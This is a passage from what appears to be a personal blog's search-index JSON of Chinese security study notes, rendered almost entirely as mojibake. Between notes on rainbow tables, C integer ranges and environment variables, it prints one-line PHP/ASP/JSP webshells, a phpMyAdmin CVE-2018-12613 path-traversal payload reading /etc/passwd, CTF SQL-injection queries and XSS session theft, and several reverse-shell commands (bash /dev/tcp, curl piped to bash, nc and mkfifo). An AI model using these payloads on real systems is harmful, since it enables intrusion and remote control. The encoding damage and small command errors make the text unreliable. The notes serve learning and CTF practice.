´è§£2.å­—å…¸3.å½©è™¹è¡¨è¿™é‡Œé‡ç‚¹è¯´ä¸€ä¸‹å½©è™¹è¡¨ï¼Œå½©è™¹è¡¨å¹¶ä¸æ˜¯å•çº¯çš„åŸæ–‡-å¯†æ–‡ä¸€ä¸€å¯¹åº”çš„å½¢å¼ã€‚å½©è™¹è¡¨å‰èº«â€“æ•£åˆ—é“¾è®¾åŠ å¯†å‡½æ•°ä¸ºH(X)ï¼Œåˆ™æ•£åˆ—é“¾å­˜åœ¨ä¸€ä¸ªçº¦ç®€å‡½æ•°R(X)ï¼Œå…¶å®šä¹‰åŸŸå’Œå€¼åŸŸä¸H(X)ç›¸åã€‚å¯¹äºæ•£åˆ—é“¾å’Œå½©è™¹è¡¨è¯¦ç»†çš„è®¡ç®—è¿‡ç¨‹æˆ‘è¿˜æ²¡çœ‹å¤ªæ˜ç™½ï¼Œè¯·æ•™å®Œè€å¸ˆå†æ¥å†™ã€‚ç°åœ¨å·²çŸ¥çš„æ˜¯å½©è™¹è¡¨æ˜¯ä¸€ç§ä¸­å’Œçš„æ–¹å¼æ¥ç ´è§£å“ˆå¸Œå€¼ã€‚å½“kè¶Šå¤§æ—¶ï¼Œç ´è§£æ—¶é—´å°±è¶Šé•¿ï¼Œä½†å½©è™¹è¡¨æ‰€å ç”¨çš„ç©ºé—´å°±è¶Šå°ï¼›ç›¸åï¼Œkè¶Šå°æ—¶ï¼Œå½©è™¹è¡¨æœ¬èº«å°±è¶Šå¤§ï¼Œç›¸åº”çš„ç ´è§£æ—¶é—´å°±è¶ŠçŸ­ã€‚ åŠ saltæŠµæŠ—å½©è™¹è¡¨saltå¯ä»¥æ˜¯ä¸€ä¸²éšæœºæ•°ã€‚å‡è®¾åŸæ–‡æ˜¯abcï¼Œä¸åŠ saltåŠ å¯†åçš„æ•°æ®ä¸º DEFï¼ŒåŠ saltåŠ å¯†åçš„æ•°æ®ä¸ºGKDå½©è™¹è¡¨è¿˜åŸå‡ºDEFçš„æ¦‚ç‡ç›¸å¯¹åŠ saltåçš„æ¦‚ç‡ç›¸å¯¹å¤§ä¸€äº›ã€‚å› ä¸ºå¯¹GKDè¿˜åŸåçš„æ•°æ®å¤§æ¦‚ç‡å°±ä¸æ˜¯åŸæ•°æ®abcäº†ã€‚åº”ç”¨åœºæ™¯ï¼šç”¨æˆ·æ³¨å†Œæ—¶ï¼šhash(password+salt)-&gt;DB,salt-&gt;DBç”¨æˆ·ç™»å½•æ—¶ if(hash_in_db==hash(input_username+salt)) return true; php file_get_contents()file_get_contents()æ–¹æ³•æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥åˆ°å­—ç¬¦ä¸²ä¸­ã€‚ webshellwebshellæ˜¯ä»€ä¹ˆï¼Œshellæ˜¯ä»€ä¹ˆï¼Ÿshellæ˜¯ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„å·¥å…·ã€å¹³å°ã€‚webshellå°±æ˜¯åŸºäºwebçš„shellï¼Œå¯ä»¥ç”¨äºç½‘ç«™ç®¡ç†ç­‰åŠŸèƒ½ã€‚å¸¸è§çš„webshellå°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚phpçš„ å°†è¿™å¥è¯å†™å…¥ä»¥PHPä¸ºåç«¯çš„ç½‘ç«™åï¼Œé€šè¿‡å¯¹è¯¥æ–‡ä»¶ä¼ å‚æ•°www.tst.com/1.php?cmd=whoamiç›¸å½“äºåœ¨shellä¸­æ‰§è¡Œwhoamiã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸€äº›webshellç®¡ç†å·¥å…·æ–¹ä¾¿æ“ä½œï¼Œæ¯”å¦‚èœåˆ€ï¼Œèšå‰‘ã€‚aspä¸€å¥è¯ï¼š &lt;%eval request(â€œxâ€)%&gt; &lt;%execute request(â€œMHâ€)%&gt;jspä¸€å¥è¯ï¼š&lt;% Runtime.getRuntime().exec(request.getParameter(â€œshellâ€)); %&gt;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"20200404å­¦ä¹ ç¬”è®°","slug":"20200404å­¦ä¹ ç¬”è®°","date":"2020-04-04T14:17:15.000Z","updated":"2020-04-07T09:00:33.908Z","comments":true,"path":"2020/04/04/20200404å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/04/04/20200404%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ç¼…æ€€å…ˆçƒˆï¼Œå¾è¾ˆå½“è‡ªå¼ºã€‚CVE-2018-12613 phpmyadmin LFI &amp;&amp;buuoj ezweb : )å‚è€ƒé“¾æ¥ï¼šhttps://www.freebuf.com/vuls/176064.htmlé¦–å…ˆåˆ†æindex.php:åœ¨index.php ç¬¬56è¡Œï¼Œ ä¼ å…¥çš„targetå‚æ•°éœ€è¦æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼š1.æ˜¯å­—ç¬¦ä¸²2.ä¸èƒ½ä»¥indexå¼€å¤´3.ä¸åœ¨é»‘åå•å†…4.é€šè¿‡checkPageValidityå‡½æ•°æ£€éªŒï¼Œå³è¿”å›trueè·Ÿè¿›checkPageValidityå‡½æ•° 1234567891011121314151617181920212223242526272829303132333435public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; å‡½æ•°åˆ†æï¼šå¦‚æœä¼ å…¥çš„ç™½åå•ä¸ºç©ºçš„è¯ï¼Œå°±å»æ‰¾goto_whitelistã€‚å¦‚æœæ²¡æœ‰è®¾ç½®pageæˆ–è€…pageå˜é‡ä¸æ˜¯å­—ç¬¦ä¸² è¿”å›falseã€‚å¦‚æœpageåœ¨ç™½åå•å†…ï¼Œè¿”å›true mb_strpos($page . â€˜?â€™, â€˜?â€™)è·å¾—pageå˜é‡?å‰çš„é•¿åº¦ æ³¨æ„ï¼šâ€™.â€™ç”¨æ¥è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸² mb_substr è·å¾—[start,end)é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚ ä¸¾ä¾‹å¦‚ä¸‹ï¼š ç»§ç»­åˆ†æã€‚ æ¥åˆ° 123456789$_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; å°†?ä¸¤æ¬¡urlencodeç¼–ç åä¸º%253fã€‚è¿›å…¥phpåä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œå˜æˆ%3fï¼Œç„¶åå†æ¬¡è§£ç ï¼ŒæˆåŠŸç»•è¿‡æ£€éªŒã€‚ï¼ˆä¸åŒé‡ç¼–ç æ— æ³•ç»•è¿‡çš„åŸå› ä¸º:å¦‚æœç›´æ¥ç»™ä¸€ä¸ª?çš„è¯,åœ¨ç¬¬ä¸€ä¸ªæˆªå–éªŒè¯ä¸­ï¼Œphpä¼šæŠŠé—®å·åé¢çš„ä¸œè¥¿å½“ä½œå‚æ•°ï¼Œincludeçš„è¿˜æ˜¯db_sql.phpã€‚ï¼‰ æ‰€ä»¥index.phpä¸­çš„INCLUDEå˜æˆäº†ï¼š include db_sql.php%3f(ç”±äºphpä¼šæŠŠdb_sql.php%3få½“æˆç›®å½•ï¼Œæ‰€ä»¥éœ€è¦å¤šåŠ ä¸€ä¸ª../æ¥è·¨ç›®å½•ã€‚ï¼‰ payload:http://192.168.0.106:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"}]},{"title":"20200402å­¦ä¹ ç¬”è®°","slug":"20200402å­¦ä¹ ç¬”è®°","date":"2020-04-02T04:14:20.000Z","updated":"2020-04-03T14:01:37.184Z","comments":true,"path":"2020/04/02/20200402å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/04/02/20200402%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"åŠ¨æ€è§„åˆ’ä»Šå¤©ä¸‹åˆåšäº†ä¸€ä¸ªåŠ¨æ€è§„åˆ’çš„é¢˜ è¿˜æ²¡å¤§å¼„æ˜ç™½ï¼Œæçš„ä¸è°ˆã€‚ç­‰æˆ‘ä¸‹æ¬¡çœ‹åˆ°è¿™or å­¦ä¹ ä¸€æ®µæ—¶é—´åŠ¨æ€è§„åˆ’åå†å»åšã€‚ buuctfä»Šå¤©åšäº†ä¸€é“ciscn 2019çš„é¢˜ã€‚å¾ˆæƒ­æ„§ã€‚è¿™é“é¢˜æ˜¯åä¸œåŒ—èµ›åŒºåˆ†åŒºèµ›çš„ä¸€é“webé¢˜ï¼Œå½“æ—¶æˆ‘æ²¡åšå‡ºæ¥ï¼Œåªåšåˆ°äº†å¦‚ä½•ç ´è§£md5å‰å…­ä½çš„ä¸€æ­¥ï¼Œè€Œä¸”æ˜¯ç”¨åˆ«äººå†™çš„è„šæœ¬è·‘çš„ã€‚å½“æ—¶æ²¡åšxssçš„éƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯è¿‡æ»¤çš„é—®é¢˜ï¼Œè¿‡æ»¤çš„å­—ç¬¦å¤ªå¤šï¼Œå½“æ—¶æ²¡æœ‰æƒ³åˆ°æ€ä¹ˆç»•è¿‡ï¼Œå°±æ²¡æœ‰ç»§ç»­åšäº†â€¦.æˆ‘å¤ªèœäº†ã€‚ä»Šå¤©åœ¨æ­¤æ•´ç†ä¸€ä¸‹è¯¥é¢˜çš„è§£é¢˜æ€è·¯ã€‚é¦–å…ˆå†™ä¸€æ®µxssä»£ç ï¼Œæäº¤åæŠŠé“¾æ¥æ”¾åˆ°é—®é¢˜åé¦ˆé‚£ï¼Œç”¨è„šæœ¬è·‘ä¸€ä¸‹md5å‰6ä½ã€‚è¿™ä¸€æ­¥å®Œæˆåä¼šæœ‰ä¸€ä¸ªbotæ¨¡æ‹Ÿç®¡ç†å‘˜ï¼Œç®¡ç†å‘˜è®¿é—®åé€šè¿‡xsså‘é€ç®¡ç†å‘˜çš„èº«ä»½ä¿¡æ¯åˆ°æ¥æ”¶å¹³å°ã€‚ä»æ¥æ”¶å¹³å°è·å–åˆ°sessionåï¼Œä½¿ç”¨ç®¡ç†å‘˜ç™»å½•ã€‚æ‰«æåå°å‘ç°admin.phpPHPSESSIDä¿®æ”¹åç™»å½•å³å¯é¦–å…ˆç”¨group by åˆ¤æ–­åˆ—æ•°ï¼Œç„¶åæ‰¾ä¸€ä¸‹æ•°æ®åº“å -1 and 1=2 union select 1,2,database() from information_schema.schemata -&gt;æ•°æ®åº“å ciscnæ ¹æ®æ•°æ®åº“åæ‰¾è¡¨ï¼ˆé€šè¿‡limitçœ‹æœ‰å¤šå°‘è¡¨ã€å¤šå°‘å¤šå°‘å­—æ®µï¼‰-1 union select 1,2,table_name from information_schema.tables where table_schema=â€™ciscnâ€™ -ã€‹æ‰¾åˆ°è¡¨flag ç„¶ålimit æ‰¾å…¶ä»–çš„è¡¨ï¼Œè¿™é‡Œå…¶ä»–çš„è¡¨æ²¡å•¥ç”¨æ ¹æ®è¡¨åæ‰¾åˆ—-1 union select 1,2,column_name from information_schema.columns where table_name =â€™flagâ€™ -ã€‹æ‰¾åˆ°åˆ— flaggæ ¹æ®åˆ—åæŸ¥æ•°æ® -1 union select 1,2,flagg from flag æ‰¾åˆ°flagã€‚getflagã€‚å½³äºã€‚ã€‚å°±çœ‹çœ‹userè¡¨æœ‰å•¥æŠŠ-1 union select 1,2,table_name from information_schema.tables where table_schema=â€™ciscnâ€™ limit 1,1 æ‰¾åˆ°usersè¡¨-1 union select 1,2,column_name from information_schema.columns where table_name=â€™usersâ€™ æ‰¾åˆ°USERå­—æ®µ limit 1,1 æ‰¾åˆ°CURRENT_CONNECTIONSï¼Œusernameï¼Œpasswordå­—æ®µ-1 union select 1,username,password from users limit è¿™å¥è¯åº”è¯¥å°±å¯¹åº”ç€è¿™ä¸ªæŸ¥è¯¢æ¡† select username,password from users where id=?è¿™é“é¢˜å°±ç»“æŸäº†ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"20200331å­¦ä¹ ç¬”è®°","slug":"20200331å­¦ä¹ ç¬”è®°","date":"2020-03-31T14:04:55.000Z","updated":"2020-03-31T14:37:53.385Z","comments":true,"path":"2020/03/31/20200331å­¦ä¹ ç¬”è®°/","link":"","permalink":"https://polosec.github.io/2020/03/31/20200331%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"æµ®ç”Ÿæ—¥è®°2020.3.31 æ™´ä»Šå¤©åˆæ˜¯èœé¸¡çš„ä¸€å¤©ï¼Œåˆ·é¢˜å…¥é—¨é¢˜å°±ä¸ä¼šï¼Œå¿ƒæ€å´©äº†dpï¼Œä¸€å®šæ‹¿ä¸‹ï¼ cè¯­è¨€ç›¸å…³å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/danxibaoxxx/article/details/81236180https://blog.csdn.net/CV_Jason/article/details/85244813https://blog.csdn.net/bestkilly/article/details/80659109?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-taskhttps://blog.csdn.net/abaloon/article/details/8173552https://blog.csdn.net/ai_yue/article/details/82777806?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task ld&amp;lfè¿™æ¶‰åŠåˆ°äº†cè¯­è¨€çš„ç²¾åº¦é—®é¢˜ã€‚é¦–å…ˆçœ‹å¸¸è§æ•°æ®ç±»å‹çš„å–å€¼èŒƒå›´ï¼šchar -128 ~ +127 (1 Byte)short -32767 ~ + 32768 (2 Bytes)unsigned short 0 ~ 65536 (2 Bytes)int -2147483648 ~ +2147483647 (4 Bytes)unsigned int 0 ~ 4294967295 (4 Bytes)long == intlong long -9223372036854775808 ~ +9223372036854775807 (8 Bytes)double 1.7 * 10^308 (8 Bytes)unsigned int 0ï½4294967295long longçš„æœ€å¤§å€¼ï¼š9223372036854775807long longçš„æœ€å°å€¼ï¼š-9223372036854775808unsigned long longçš„æœ€å¤§å€¼ï¼š1844674407370955161__int64çš„æœ€å¤§å€¼ï¼š9223372036854775807__int64çš„æœ€å°å€¼ï¼š-9223372036854775808unsigned __int64çš„æœ€å¤§å€¼ï¼š18446744073709551615ç»“è®ºï¼šè¾“å…¥è¾“å‡ºlong long/doubleçš„æ—¶å€™éœ€è¦ç”¨%ld/%lf å­˜å‚¨å½¢å¼å­˜å‚¨å½¢å¼å‚è€ƒç¬¬ä¸‰ä¸ªé“¾æ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é˜¶ç æ˜¯æ€ä¹ˆå¾—æ¥çš„ï¼Œæˆ‘ä¸€å¼€å§‹ä¹Ÿæƒ³é”™äº†ã€‚ è¡¥ç è¡¨ç¤ºèŒƒå›´ä¸ºä»€ä¹ˆå…«ä½äºŒè¿›åˆ¶è¡¥ç çš„è¡¨ç¤ºèŒƒå›´æ˜¯-128 â€” +127ï¼Ÿé¦–å…ˆæ˜ç¡®ç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½ã€‚ä»¥ä¸‹ä¸ºåŸç è¡¨ç¤ºï¼šæ­£æ•°ï¼š +0â€”+12700000000â€”01111111è´Ÿæ•°ï¼š-0 â€”- -12710000000 â€”- 11111111 æ— ç¬¦å·æ•°10000000ä»£è¡¨128ï¼Œåœ¨è¡¥ç ä¸­æœ¬æ¥åº”è¯¥æ˜¯-0ï¼Œç”±äºä¸€ä¸ªæ•°å¯¹åº”ä¸€ä¸ªè¡¥ç ï¼Œæ‰€ä»¥-0çš„è¡¥ç ç”¨æ¥è¡¨ç¤º-128ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆ8ä½äºŒè¿›åˆ¶æ•°å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯-128~127ã€‚","categories":[],"tags":[{"name":"cè¯­è¨€","slug":"cè¯­è¨€","permalink":"https://polosec.github.io/tags/c%E8%AF%AD%E8%A8%80/"}]},{"title":"linux&shell&åå¼¹shell&ç¯å¢ƒå˜é‡","slug":"linux-shell-åå¼¹shell","date":"2020-03-30T02:25:51.000Z","updated":"2020-03-30T09:11:33.208Z","comments":true,"path":"2020/03/30/linux-shell-åå¼¹shell/","link":"","permalink":"https://polosec.github.io/2020/03/30/linux-shell-%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"è¿‘æœŸå­¦ä¹ äº†è®¸å¤šå…³äºLinuxçš„åŸºç¡€çŸ¥è¯†ï¼Œä¹Ÿä»ä¾§é¢åæ˜ å‡ºäº†æˆ‘ä¸Šè¯¾æ‰€å­¦çš„åŸºç¡€çŸ¥è¯†æ²¡æœ‰å¤šåŠ ç»ƒä¹ ï¼Œå¿˜äº†ä¸å°‘ã€‚æœ¬æ–‡å­¦ä¹ è·¯çº¿ï¼šé¦–å…ˆæ˜¯åœ¨CTFæ¯”èµ›ä¸­é‡åˆ°äº†éœ€è¦åå¼¹shellçš„é—®é¢˜ï¼Œé‡‡ç”¨å¸¸ç”¨åå¼¹shellçš„æ–¹å¼æ— æ³•åå¼¹ï¼Œäºæ˜¯å­¦ä¹ äº†ç”¨curlåå¼¹shellç­‰å¤šç§åå¼¹shellçš„æ–¹å¼ï¼›æ¢ç©¶åå¼¹shellçš„æœ¬è´¨ï¼Œå­¦ä¹ åˆ°äº†&lt;ä¸&gt;ä»¥åŠè¾“å…¥è¾“å‡ºé‡å®šå‘ï¼›è·‘è„šæœ¬çš„æ—¶å€™å¤ªéº»çƒ¦ï¼Œéœ€è¦åˆ‡æ¢åˆ°è„šæœ¬ç›®å½•ï¼Œäºæ˜¯å­¦ä¹ äº†å¦‚ä½•æ·»åŠ ç¯å¢ƒå˜é‡ä»¥åŠå¦‚ä½•ç”¨aliasã€‚ é¢„å¤‡çŸ¥è¯†linux shellã€åå¼¹shellã€é‡å®šå‘ã€ç¯å¢ƒå˜é‡ å‚è€ƒã€è‡´æ•¬ï¼ˆå¼ºçƒˆå»ºè®®å…ˆé˜…è¯»å‚è€ƒã€è‡´æ•¬çš„æ–‡ç« å†é˜…è¯»æœ¬æ–‡ï¼‰https://xz.aliyun.com/t/2548https://xz.aliyun.com/t/2549http://www.linuxso.com/command/alias.htmlhttps://blog.csdn.net/revilwang/article/details/8374362https://blog.csdn.net/flw8840488/article/details/90513873https://blog.csdn.net/lw305080/article/details/52054188https://www.runoob.com/linux/linux-system-contents.html shellå¦‚ä½•ç†è§£shellï¼Ÿshellæ˜¯ç”¨æˆ·ä¸Linuxå†…æ ¸ä¹‹é—´çš„ä¸€å±‚â€œä»£ç†â€ï¼Œç”¨æˆ·é€šè¿‡shellä¸Linuxå†…æ ¸å»ºç«‹è”ç³»ã€‚shellæ˜¯åœ¨å†…æ ¸åŸºç¡€ä¸Šç¼–å†™çš„åº”ç”¨ç¨‹åºã€‚å½“ç„¶ï¼Œshellä¹Ÿæ”¯æŒç¼–ç¨‹ï¼Œè¿™é‡Œä¸å±•å¼€è®²è§£ã€‚ åå¼¹shellå…ˆè¯´æ€ä¹ˆåå¼¹shellï¼Œå†è¯´åå¼¹shellçš„åŸç†ã€‚é¦–å…ˆæ”»å‡»æœºä¸Šæ‰§è¡Œ nc -lvp 8888 bashåå¼¹bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 curlåå¼¹é¦–å…ˆåœ¨å…¬ç½‘vps å†™å¥½åå¼¹shellçš„è¯­å¥ ä¿å­˜åˆ°ip/bashRCE: curl ip/bash |bash // |æ˜¯ç®¡é“ç¬¦ï¼Œæ„æ€æ˜¯å°†ä¸Šä¸€ä¸ªçš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªçš„è¾“å…¥ ncåå¼¹å—å®³æœºæ‰§è¡Œ nc -e /bin/sh ip portå¦‚æœncç‰ˆæœ¬ä¸å¯¹çš„è¯å¯ä»¥è¿™æ ·ï¼šrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f execexec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&1;done ç†è§£åå¼¹shell ç¬¬ä¸€å¥ï¼šbash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1ç†è§£ï¼šå°†äº¤äº’å¼bashçš„è¾“å‡ºä¸é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°/dev/tcp/ip/port æ–‡ä»¶ï¼Œå¹¶ä¸”å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚å‰é¢çš„&amp;&gt;ä»£è¡¨å°†è¾“å‡ºä¸é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°åé¢çš„æ–‡ä»¶ï¼Œåé¢çš„0&amp;&gt;1ä»£è¡¨å°†æ ‡å‡†è¾“å…¥ï¼ˆæ–‡ä»¶æ“ä½œç¬¦0ï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆæ–‡ä»¶æ“ä½œç¬¦1ï¼‰ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„&amp;ä»£è¡¨äº†è¯†åˆ«åé¢çš„1ä¸ºæ–‡ä»¶æ“ä½œç¬¦ï¼ˆä»£è¡¨æ ‡å‡†è¾“å‡ºï¼‰ï¼Œè€Œä¸æ˜¯â€œ1â€è¿™ä¸ªæ–‡ä»¶ã€‚Linuxæ“ä½œç³»ç»ŸæŠŠæ‰€æœ‰å†…å®¹éƒ½æŠ½è±¡ä¸ºæ–‡ä»¶ï¼ŒåŒ…æ‹¬tcpè¿æ¥ã€‚ç¤ºæ„å›¾è™šçº¿è¡¨ç¤ºäº†stdin é‡å®šå‘åˆ°stdoutï¼Œç”±äºstdoutå·²ç»é‡å®šå‘åˆ°äº†/dev/tcp/ip/port ï¼Œæ‰€ä»¥stdinä¹Ÿå°†é‡å®šå‘åˆ°/dev/tcp/ip/portã€‚ ç¬¬äºŒå¥ RCE: curl ip/bash |bash // |æ˜¯ç®¡é“ç¬¦ï¼Œæ„æ€æ˜¯å°†ä¸Šä¸€ä¸ªçš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªçš„è¾“å…¥é¦–å…ˆåœ¨å…¬ç½‘vpsä¸Šå†™ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹ä¸ºbash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 é‡å‘½åä¸ºbashç„¶åå†å—å®³æœºä¸Šæ‰§è¡Œcurl ip/bash | bash æ„æ€å°±æ˜¯è¯´é€šè¿‡curlè·å–bashçš„htmlå†…å®¹ï¼Œå¹¶ä¸”ä½œä¸ºä¸‹ä¸€ä¸ªçš„è¾“å…¥ã€‚bashæ˜¯Linuxä¸­çš„shellï¼Œç”¨äºç”¨æˆ·å’Œå†…æ ¸äº¤äº’ã€‚ç›¸å½“äºç”¨æˆ·è¾“å…¥äº†bash -i &amp;&gt; /dev/tcp/ip/prot 0&amp;&gt;1 ç¬¬ä¸‰å¥ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/fç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªç®¡é“/tmp/f ï¼Œé”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/tmp/f ,æŠŠcat /tmp/fçš„ç»“æœä¼ ç»™äº¤äº’å¼shellæ‰§è¡Œï¼Œä¼ ç»™nc ip portã€‚å½¢æˆç¯è·¯ã€‚å¤§ä½¬è§£è¯»ï¼šmkfifo å‘½ä»¤é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œcat å°†ç®¡é“é‡Œé¢çš„å†…å®¹è¾“å‡ºä¼ é€’ç»™/bin/shï¼Œshä¼šæ‰§è¡Œç®¡é“é‡Œçš„å‘½ä»¤å¹¶å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºç»“æœé€šè¿‡nc ä¼ åˆ°è¯¥ç®¡é“ï¼Œç”±æ­¤å½¢æˆäº†ä¸€ä¸ªå›è·¯æˆ‘çš„è§£è¯»ï¼šå…¶å®ååŠæ®µçš„æ„æ€å°±æ˜¯æŠŠä¼ è¿›æ¥çš„å‘½ä»¤ç”¨/bash/sh æ‰§è¡Œï¼Œç„¶åæŠŠç»“æœä¼ ç»™ip port,ç„¶å ip port å‘é€çš„ç»“æœä¼ ç»™/tmp/f,ç„¶åcat tmp /f,ç„¶åshellæ‰§è¡Œâ€¦.å°±è¿™ä¹ˆå¥—å¨ƒï¼Œäº¤äº’å¼shellå°±æˆäº†ã€‚ç¯å¢ƒå˜é‡ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼š /etc/profile å…¨å±€ç”¨æˆ·ï¼Œåº”ç”¨äºæ‰€æœ‰çš„Shellã€‚ /$HOME/.profile å½“å‰ç”¨æˆ·ï¼Œåº”ç”¨äºæ‰€æœ‰çš„Shellã€‚ /etc/bash_bashrc å…¨å±€ç”¨æˆ·ï¼Œåº”ç”¨äºBash Shellã€‚ ~/.bashrc å±€éƒ¨å½“å‰ï¼Œåº”ç”¨äºBash Sellã€‚å†™å…¥/etc/profileæ–‡ä»¶export $PATH:/dir/subdirç¯å¢ƒå˜é‡è§£æè¿‡ç¨‹ç³»ç»Ÿç¯å¢ƒå˜é‡/etc/profile: æ­¤æ–‡ä»¶ä¸ºç³»ç»Ÿçš„æ¯ä¸ªç”¨æˆ·è®¾ç½®ç¯å¢ƒä¿¡æ¯,å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡ç™»å½•æ—¶,è¯¥æ–‡ä»¶è¢«æ‰§è¡Œ,å¹¶ä»/etc/profile.dç›®å½•çš„é…ç½®æ–‡ä»¶ä¸­æœé›†shellçš„è®¾ç½®./etc/bashrc: ä¸ºæ¯ä¸€ä¸ªè¿è¡Œbash shellçš„ç”¨æˆ·æ‰§è¡Œæ­¤æ–‡ä»¶.å½“bash shellè¢«æ‰“å¼€æ—¶,è¯¥æ–‡ä»¶è¢«è¯»å–.ç”¨æˆ·ç¯å¢ƒå˜é‡.bash_profile ï¼šå®šä¹‰äº†ç”¨æˆ·çš„ä¸ªäººåŒ–è·¯å¾„ä¸ç¯å¢ƒå˜é‡çš„æ–‡ä»¶åç§°ã€‚æ¯ä¸ªç”¨æˆ·éƒ½å¯ä½¿ç”¨è¯¥æ–‡ä»¶è¾“å…¥ä¸“ç”¨äºè‡ªå·±ä½¿ç”¨çš„shellä¿¡æ¯,å½“ç”¨æˆ·ç™»å½•æ—¶,è¯¥æ–‡ä»¶ä»…ä»…æ‰§è¡Œä¸€æ¬¡ã€‚ï¼ˆåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æœ‰æ‰§è¡Œ.bashrcçš„è„šæœ¬ï¼‰.bashrc ï¼šè¯¥æ–‡ä»¶åŒ…å«ä¸“ç”¨äºä½ çš„shellçš„bashä¿¡æ¯,å½“ç™»å½•æ—¶ä»¥åŠæ¯æ¬¡æ‰“å¼€æ–°çš„shellæ—¶,è¯¥è¯¥æ–‡ä»¶è¢«è¯»å–ã€‚ä¾‹å¦‚ä½ å¯ä»¥å°†ç”¨æˆ·è‡ªå®šä¹‰çš„aliasæˆ–è€…è‡ªå®šä¹‰å˜é‡å†™åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚.bash_history ï¼šè®°å½•å‘½ä»¤å†å²ç”¨çš„ã€‚.bash_logout ï¼šå½“é€€å‡ºshellæ—¶ï¼Œä¼šæ‰§è¡Œè¯¥æ–‡ä»¶ã€‚å¯ä»¥æŠŠä¸€äº›æ¸…ç†çš„å·¥ä½œæ”¾åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ç”¨æˆ·åˆ‡æ¢ä¸ç¯å¢ƒå˜é‡å¤§éƒ¨åˆ†Linuxå‘è¡Œç‰ˆçš„é»˜è®¤è´¦æˆ·æ˜¯æ™®é€šè´¦æˆ·ï¼Œè€Œæ›´æ”¹ç³»ç»Ÿæ–‡ä»¶æˆ–è€…æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œéœ€è¦rootèº«ä»½æ‰èƒ½è¿›è¡Œï¼Œè¿™å°±éœ€è¦ä»å½“å‰ç”¨æˆ·åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼ŒLinuxä¸­åˆ‡æ¢ç”¨æˆ·çš„å‘½ä»¤æ˜¯suæˆ–su 